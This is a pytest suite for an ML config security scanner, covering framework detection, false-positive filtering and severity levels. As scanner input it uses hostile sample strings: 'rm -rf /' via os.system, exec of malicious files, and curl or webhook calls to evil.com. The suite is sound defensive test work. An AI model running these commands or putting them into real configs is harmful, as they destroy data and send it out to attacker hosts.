"""
Unit tests for smart detection features in ManifestScanner.
Tests ML context awareness, value-based analysis, and false positive elimination.
"""

import json
import tempfile
from pathlib import Path

import pytest

from modelaudit.scanners.base import IssueSeverity
from modelaudit.scanners.manifest_scanner import ManifestScanner


class TestMLContextDetection:
    """Test ML context detection functionality."""

    def test_detect_huggingface_context(self):
        """Test detection of Hugging Face model context."""
        scanner = ManifestScanner()

        hf_config = {
            "tokenizer_class": "LlamaTokenizer",
            "model_type": "llama",
            "architectures": ["LlamaForCausalLM"],
            "transformers_version": "4.35.0",
        }

        context = scanner._detect_ml_context(hf_config)

        assert context["framework"] == "huggingface"
        assert context["confidence"] >= 2
        assert context["is_model_config"] is True

    def test_detect_pytorch_context(self):
        """Test detection of PyTorch model context."""
        scanner = ManifestScanner()

        pytorch_config = {
            "torch_dtype": "float16",
            "state_dict": {"layer1.weight": "tensor"},
            "pytorch_model": "model.pt",
        }

        context = scanner._detect_ml_context(pytorch_config)

        assert context["framework"] == "pytorch"
        assert context["confidence"] >= 1

    def test_detect_tensorflow_context(self):
        """Test detection of TensorFlow model context."""
        scanner = ManifestScanner()

        tf_config = {
            "tensorflow": "2.13.0",
            "saved_model": "tf_model/",
            "tf_version": "2.13.0",
        }

        context = scanner._detect_ml_context(tf_config)

        assert context["framework"] == "tensorflow"
        assert context["confidence"] >= 1

    def test_detect_sklearn_context(self):
        """Test detection of scikit-learn model context."""
        scanner = ManifestScanner()

        sklearn_config = {
            "sklearn": "1.3.0",
            "pickle_module": "sklearn.externals.joblib",
        }

        context = scanner._detect_ml_context(sklearn_config)

        assert context["framework"] == "sklearn"
        assert context["confidence"] >= 1

    def test_detect_tokenizer_context(self):
        """Test detection of tokenizer-specific context."""
        scanner = ManifestScanner()

        tokenizer_config = {
            "tokenizer_class": "BertTokenizer",
            "added_tokens_decoder": {"1": {"content": "[CLS]"}},
            "special_tokens_map": {"cls_token": "[CLS]"},
            "bos_token": "<s>",
            "eos_token": "</s>",
        }

        context = scanner._detect_ml_context(tokenizer_config)

        assert context["is_tokenizer"] is True
        assert context["confidence"] >= 2

    def test_detect_model_config_context(self):
        """Test detection of model configuration context."""
        scanner = ManifestScanner()

        model_config = {
            "hidden_size": 768,
            "num_attention_heads": 12,
            "num_hidden_layers": 12,
            "vocab_size": 50257,
            "max_position_embeddings": 1024,
        }

        context = scanner._detect_ml_context(model_config)

        assert context["is_model_config"] is True
        assert context["confidence"] >= 2

    def test_detect_no_ml_context(self):
        """Test detection when no ML context is present."""
        scanner = ManifestScanner()

        non_ml_config = {
            "application": "web_server",
            "port": 8080,
            "database_url": "mysql://localhost",
        }

        context = scanner._detect_ml_context(non_ml_config)

        assert context["framework"] is None
        assert context["confidence"] == 0
        assert context["is_tokenizer"] is False
        assert context["is_model_config"] is False


class TestValueBasedAnalysis:
    """Test value-based dangerous content detection."""

    def test_detect_dangerous_import_statements(self):
        """Test detection of dangerous import statements in values."""
        scanner = ManifestScanner()

        test_cases = [
            ("import os; os.system('rm -rf /')", True),
            ("import subprocess; subprocess.call(['ls'])", True),
            ("import os\nos.system('malicious')", True),
            ("import numpy as np", False),
            ("from transformers import AutoTokenizer", False),
            ("regular string value", False),
        ]

        for value, expected in test_cases:
            result = scanner._is_actually_dangerous_value("test_key", value)
            assert result == expected, f"Failed for value: {value}"

    def test_detect_dangerous_eval_exec(self):
        """Test detection of eval/exec patterns in values."""
        scanner = ManifestScanner()

        dangerous_values = [
            "eval(user_input)",
            "exec(open('malicious.py').read())",
            "EVAL(some_code)",
            "exec('print(hello)')",
        ]

        safe_values = [
            "evaluation_metric",
            "execute_plan",
            "model_evaluation",
            "execution_time",
        ]

        for value in dangerous_values:
            assert scanner._is_actually_dangerous_value("key", value) is True

        for value in safe_values:
            assert scanner._is_actually_dangerous_value("key", value) is False

    def test_detect_dangerous_system_commands(self):
        """Test detection of system command patterns."""
        scanner = ManifestScanner()

        dangerous_values = [
            "os.system('curl evil.com')",
            "shell=True",
            "rm -rf /tmp/*",
            "/bin/sh -c 'malicious'",
            "cmd.exe /c dir",
        ]

        for value in dangerous_values:
            assert scanner._is_actually_dangerous_value("key", value) is True

    def test_non_string_values_safe(self):
        """Test that non-string values are considered safe."""
        scanner = ManifestScanner()

        non_string_values = [
            123,
            True,
            False,
            ["list", "items"],
            {"dict": "value"},
            None,
        ]

        for value in non_string_values:
            assert scanner._is_actually_dangerous_value("key", value) is False


class TestContextAwareFiltering:
    """Test context-aware filtering to eliminate false positives."""

    def test_should_ignore_ml_input_output_patterns(self):
        """Test ignoring legitimate ML input/output patterns."""
        scanner = ManifestScanner()

        ml_context = {
            "framework": "huggingface",
            "confidence": 3,
            "is_model_config": True,
        }

        safe_ml_keys = [
            ("model_input_names", ["input_ids"], ["file_access"]),
            ("output_hidden_states", False, ["file_access"]),
            ("input_embeddings", "continuous", ["file_access"]),
            ("hidden_size", 768, ["file_access"]),
            ("attention_output", True, ["file_access"]),
        ]

        for key, value, matches in safe_ml_keys:
            result = scanner._should_ignore_in_context(key, value, matches, ml_context)
            assert result is True, f"Should ignore {key} in ML context"

    def test_should_ignore_tokenizer_specific_keys(self):
        """Test ignoring tokenizer-specific configuration keys."""
        scanner = ManifestScanner()

        tokenizer_context = {
            "framework": "huggingface",
            "confidence": 2,
            "is_tokenizer": True,
        }

        tokenizer_keys = [
            ("added_tokens_decoder", {}, ["execution"]),
            ("special_tokens_map", {}, ["file_access"]),
            ("tokenizer_class", "BertTokenizer", ["execution"]),
            ("model_input_names", ["input_ids"], ["file_access"]),
        ]

        for key, value, matches in tokenizer_keys:
            result = scanner._should_ignore_in_context(
                key,
                value,
                matches,
                tokenizer_context,
            )
            assert result is True, f"Should ignore tokenizer key: {key}"

    def test_should_ignore_ml_token_patterns(self):
        """Test ignoring ML token ID patterns (not security credentials)."""
        scanner = ManifestScanner()

        ml_context = {"framework": "huggingface", "confidence": 3}

        token_patterns = [
            ("bos_token_id", 1, ["credentials"]),
            ("eos_token_id", 2, ["credentials"]),
            ("pad_token_id", 0, ["credentials"]),
            ("token_type_ids", [0, 1], ["credentials"]),
        ]

        for key, value, matches in token_patterns:
            result = scanner._should_ignore_in_context(key, value, matches, ml_context)
            assert result is True, f"Should ignore ML token pattern: {key}"

    def test_should_not_ignore_non_ml_context(self):
        """Test that non-ML contexts don't get filtered."""
        scanner = ManifestScanner()

        non_ml_context = {"framework": None, "confidence": 0, "is_tokenizer": False}

        suspicious_keys = [
            ("api_key", "secret123", ["credentials"]),
            ("file_path", "/tmp/data", ["file_access"]),
            ("command", "rm -rf /", ["execution"]),
        ]

        for key, value, matches in suspicious_keys:
            result = scanner._should_ignore_in_context(
                key,
                value,
                matches,
                non_ml_context,
            )
            assert result is False, f"Should not ignore {key} in non-ML context"

    def test_should_not_ignore_actual_file_paths(self):
        """Test that actual file paths are not ignored even in ML context."""
        scanner = ManifestScanner()

        ml_context = {"framework": "pytorch", "confidence": 2}

        actual_paths = [
            ("model_dir", "/tmp/models/my-model", ["file_access"]),
            ("save_path", "/data/checkpoints/model.pt", ["file_access"]),
            ("output_file", "results.json", ["file_access"]),
        ]

        for key, value, matches in actual_paths:
            result = scanner._should_ignore_in_context(key, value, matches, ml_context)
            assert result is False, f"Should not ignore actual file path: {key}={value}"


class TestFilePathDetection:
    """Test file path detection functionality."""

    def test_is_file_path_value_absolute_paths(self):
        """Test detection of absolute file paths."""
        scanner = ManifestScanner()

        absolute_paths = [
            "/tmp/model.pt",
            "/home/user/data.json",
            "/var/log/training.log",
            "C:\\Users\\model\\weights.h5",
            "D:\\data\\dataset.csv",
        ]

        for path in absolute_paths:
            assert scanner._is_file_path_value(path) is True, f"Should detect absolute path: {path}"

    def test_is_file_path_value_relative_paths(self):
        """Test detection of relative file paths with separators."""
        scanner = ManifestScanner()

        relative_paths = [
            "models/bert.pt",
            "data\\training\\set.csv",
            "./config/model.json",
            "../weights/checkpoint.h5",
        ]

        for path in relative_paths:
            assert scanner._is_file_path_value(path) is True, f"Should detect relative path: {path}"

    def test_is_file_path_value_file_extensions(self):
        """Test detection based on file extensions."""
        scanner = ManifestScanner()

        file_extensions = [
            "model.pt",
            "weights.h5",
            "config.json",
            "data.csv",
            "log.txt",
            "checkpoint.onnx",
        ]

        for filename in file_extensions:
            assert scanner._is_file_path_value(filename) is True, f"Should detect file extension: {filename}"

    def test_is_file_path_value_common_path_indicators(self):
        """Test detection of common path indicators."""
        scanner = ManifestScanner()

        path_indicators = [
            "/tmp/cache",
            "/var/models",
            "/data/training",
            "c:\\temp\\model",
            "/home/user/workspace",
        ]

        for path in path_indicators:
            assert scanner._is_file_path_value(path) is True, f"Should detect path indicator: {path}"

    def test_is_file_path_value_non_paths(self):
        """Test that non-path values are not detected as paths."""
        scanner = ManifestScanner()

        non_paths = [
            "model_input_names",
            "hidden_size",
            "attention_heads",
            "bert-base-uncased",
            "transformer_model",
            True,
            False,
            123,
            ["input_ids", "attention_mask"],
        ]

        for value in non_paths:
            assert scanner._is_file_path_value(value) is False, f"Should not detect as path: {value}"


class TestSeverityAssignment:
    """Test context-aware severity assignment."""

    def test_execution_patterns_always_error(self):
        """Test that execution patterns always get ERROR severity."""
        scanner = ManifestScanner()

        ml_context = {"framework": "huggingface", "confidence": 3}
        non_ml_context = {"framework": None, "confidence": 0}

        execution_matches = ["execution"]

        # Even in ML context, execution should be ERROR
        severity_ml = scanner._get_context_aware_severity(execution_matches, ml_context)
        severity_non_ml = scanner._get_context_aware_severity(
            execution_matches,
            non_ml_context,
        )

        assert severity_ml == IssueSeverity.CRITICAL
        assert severity_non_ml == IssueSeverity.CRITICAL

    def test_credentials_high_priority(self):
        """Test that credentials get WARNING severity."""
        scanner = ManifestScanner()

        ml_context = {"framework": "pytorch", "confidence": 2}

        credentials_matches = ["credentials"]
        severity = scanner._get_context_aware_severity(credentials_matches, ml_context)

        assert severity == IssueSeverity.WARNING

    def test_file_access_downgraded_in_ml_context(self):
        """Test that file_access gets downgraded to INFO in ML context."""
        scanner = ManifestScanner()

        high_confidence_ml = {"framework": "huggingface", "confidence": 3}
        low_confidence_context = {"framework": None, "confidence": 1}

        file_access_matches = ["file_access"]

        severity_high_ml = scanner._get_context_aware_severity(
            file_access_matches,
            high_confidence_ml,
        )
        severity_low = scanner._get_context_aware_severity(
            file_access_matches,
            low_confidence_context,
        )

        assert severity_high_ml == IssueSeverity.INFO
        assert severity_low == IssueSeverity.WARNING

    def test_network_access_downgraded_in_ml_context(self):
        """Test that network_access gets downgraded to INFO in ML context."""
        scanner = ManifestScanner()

        high_confidence_ml = {"framework": "tensorflow", "confidence": 3}

        network_matches = ["network_access"]
        severity = scanner._get_context_aware_severity(
            network_matches,
            high_confidence_ml,
        )

        assert severity == IssueSeverity.INFO

    def test_mixed_patterns_highest_severity(self):
        """Test that mixed patterns get the highest applicable severity."""
        scanner = ManifestScanner()

        ml_context = {"framework": "huggingface", "confidence": 2}

        # Mix of execution and file_access should prioritize execution (ERROR)
        mixed_matches = ["execution", "file_access"]
        severity = scanner._get_context_aware_severity(mixed_matches, ml_context)

        assert severity == IssueSeverity.CRITICAL


class TestIntegrationScenarios:
    """Integration tests with realistic ML configuration scenarios."""

    def test_huggingface_tokenizer_no_false_positives(self):
        """Test that legitimate HF tokenizer config produces no false positives."""
        hf_tokenizer_config = {
            "tokenizer_class": "LlamaTokenizer",
            "added_tokens_decoder": {
                "1": {"content": "<s>", "lstrip": False, "normalized": False},
                "2": {"content": "</s>", "lstrip": False, "normalized": False},
            },
            "model_input_names": ["input_ids", "attention_mask"],
            "model_max_length": 4096,
            "bos_token": "<s>",
            "eos_token": "</s>",
            "pad_token": "<unk>",
            "special_tokens_map": {"bos_token": "<s>", "eos_token": "</s>"},
        }

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(hf_tokenizer_config, f)
            test_file = f.name

        try:
            scanner = ManifestScanner()
            result = scanner.scan(test_file)

            # Should have no errors or warnings
            errors = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
            warnings = [i for i in result.issues if i.severity == IssueSeverity.WARNING]

            assert len(errors) == 0, f"Found unexpected errors: {[e.message for e in errors]}"
            assert len(warnings) == 0, f"Found unexpected warnings: {[w.message for w in warnings]}"

        finally:
            Path(test_file).unlink(missing_ok=True)

    def test_pytorch_model_config_no_false_positives(self):
        """Test that legitimate PyTorch model config produces no false positives."""
        pytorch_config = {
            "architectures": ["LlamaForCausalLM"],
            "model_type": "llama",
            "hidden_size": 4096,
            "num_attention_heads": 32,
            "num_hidden_layers": 32,
            "vocab_size": 32000,
            "max_position_embeddings": 4096,
            "output_attentions": False,
            "output_hidden_states": False,
            "torch_dtype": "float16",
        }

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(pytorch_config, f)
            test_file = f.name

        try:
            scanner = ManifestScanner()
            result = scanner.scan(test_file)

            # Should have no errors or warnings
            errors = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
            warnings = [i for i in result.issues if i.severity == IssueSeverity.WARNING]

            assert len(errors) == 0
            assert len(warnings) == 0

        finally:
            Path(test_file).unlink(missing_ok=True)

    def test_dangerous_config_still_detected(self):
        """Test that actually dangerous configurations are still detected."""
        dangerous_config = {
            "model_name": "safe_model",
            "initialization_script": "import os; os.system('rm -rf /')",
            "custom_code": "exec(open('/tmp/malicious.py').read())",
            "webhook_url": "http://evil.com/steal-data",
            "api_key": "secret_key_123",
        }

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(dangerous_config, f)
            test_file = f.name

        try:
            scanner = ManifestScanner()
            result = scanner.scan(test_file)

            # Should detect dangerous content
            errors = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
            warnings = [i for i in result.issues if i.severity == IssueSeverity.WARNING]

            # Should have errors for dangerous values
            dangerous_value_errors = [e for e in errors if e.details.get("analysis") == "value_based"]
            assert len(dangerous_value_errors) >= 2  # initialization_script and custom_code

            # Should have warnings for network access and credentials
            assert len(warnings) >= 1

        finally:
            Path(test_file).unlink(missing_ok=True)

    def test_mixed_safe_and_dangerous_content(self):
        """Test configuration with both safe ML content and dangerous elements."""
        mixed_config = {
            # Safe ML content
            "tokenizer_class": "BertTokenizer",
            "model_input_names": ["input_ids", "attention_mask"],
            "hidden_size": 768,
            # Dangerous content
            "init_script": "import subprocess; subprocess.call(['curl', 'evil.com'])",
            "data_exfiltration": "http://malicious.com/api",
        }

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(mixed_config, f)
            test_file = f.name

        try:
            scanner = ManifestScanner()
            result = scanner.scan(test_file)

            # Should ignore safe ML patterns but catch dangerous ones
            errors = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]

            # Should have at least one error for dangerous value
            dangerous_errors = [
                e for e in errors if "init_script" in e.message or e.details.get("analysis") == "value_based"
            ]
            assert len(dangerous_errors) >= 1

        finally:
            Path(test_file).unlink(missing_ok=True)


class TestEdgeCases:
    """Test edge cases and error handling."""

    def test_empty_config(self):
        """Test handling of empty configuration."""
        scanner = ManifestScanner()

        empty_configs = [{}, {"nested": {}}, {"list": []}]

        for config in empty_configs:
            context = scanner._detect_ml_context(config)
            assert context["confidence"] == 0
            assert context["framework"] is None

    def test_non_dict_input(self):
        """Test handling of non-dictionary input."""
        scanner = ManifestScanner()

        non_dict_inputs = [[], "string", 123, None, True]

        for input_val in non_dict_inputs:
            # Should not crash
            context = scanner._detect_ml_context(input_val)
            assert context["confidence"] == 0

    def test_deeply_nested_structures(self):
        """Test handling of deeply nested configuration structures."""
        deeply_nested = {
            "level1": {
                "level2": {
                    "level3": {
                        "level4": {
                            "tokenizer_class": "BertTokenizer",
                            "dangerous_code": "exec('malicious')",
                        },
                    },
                },
            },
        }

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(deeply_nested, f)
            test_file = f.name

        try:
            scanner = ManifestScanner()
            result = scanner.scan(test_file)

            # Should detect both ML context and dangerous content in nested structure
            errors = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
            assert len(errors) >= 1

        finally:
            Path(test_file).unlink(missing_ok=True)

    def test_unicode_and_special_characters(self, tmp_path):
        """Test handling of Unicode and special characters."""
        test_file = tmp_path / "test_unicode.json"
        unicode_config = {
            "model_name": "测试模型",
            "description": "Тестовая модель",
            "tokenizer_class": "BertTokenizer",
            "special_chars": "!@#$%^&*()_+{}|:<>?",
            "emoji_field": "🤖🔥💯",
        }

        with test_file.open("w", encoding="utf-8") as f:
            json.dump(unicode_config, f, ensure_ascii=False)

        scanner = ManifestScanner()
        result = scanner.scan(str(test_file))

        # Should handle Unicode without crashing
        assert result.success is True


# Test fixtures and helpers
@pytest.fixture
def temp_config_file():
    """Create a temporary configuration file for testing."""
    files_created = []

    def _create_file(content, suffix=".json"):
        with tempfile.NamedTemporaryFile(mode="w", suffix=suffix, delete=False) as f:
            if isinstance(content, dict):
                json.dump(content, f, indent=2)
            else:
                f.write(content)
            files_created.append(f.name)
            return f.name

    yield _create_file

    # Cleanup
    for file_path in files_created:
        Path(file_path).unlink(missing_ok=True)


@pytest.fixture
def scanner():
    """Create a ManifestScanner instance for testing."""
    return ManifestScanner()


# Parameterized tests for comprehensive coverage
@pytest.mark.parametrize(
    "framework,config_keys,expected_framework",
    [
        ("huggingface", ["tokenizer_class", "model_type"], "huggingface"),
        ("pytorch", ["torch_dtype", "state_dict"], "pytorch"),
        ("tensorflow", ["tensorflow", "saved_model"], "tensorflow"),
        ("sklearn", ["sklearn", "pickle_module"], "sklearn"),
    ],
)
def test_framework_detection_parametrized(
    scanner,
    framework,
    config_keys,
    expected_framework,
):
    """Parametrized test for framework detection."""
    config = {key: f"test_{key}" for key in config_keys}
    context = scanner._detect_ml_context(config)
    assert context["framework"] == expected_framework


@pytest.mark.parametrize(
    "dangerous_value,should_detect",
    [
        ("import os; os.system('rm -rf /')", True),
        ("exec(malicious_code)", True),
        ("eval(user_input)", True),
        ("subprocess.call(['rm', '-rf', '/'])", True),
        ("shell=True", True),
        ("import numpy as np", False),
        ("from transformers import AutoModel", False),
        ("model_evaluation_metrics", False),
        ("execute_training_pipeline", False),
    ],
)
def test_dangerous_value_detection_parametrized(
    scanner,
    dangerous_value,
    should_detect,
):
    """Parametrized test for dangerous value detection."""
    result = scanner._is_actually_dangerous_value("test_key", dangerous_value)
    assert result == should_detect
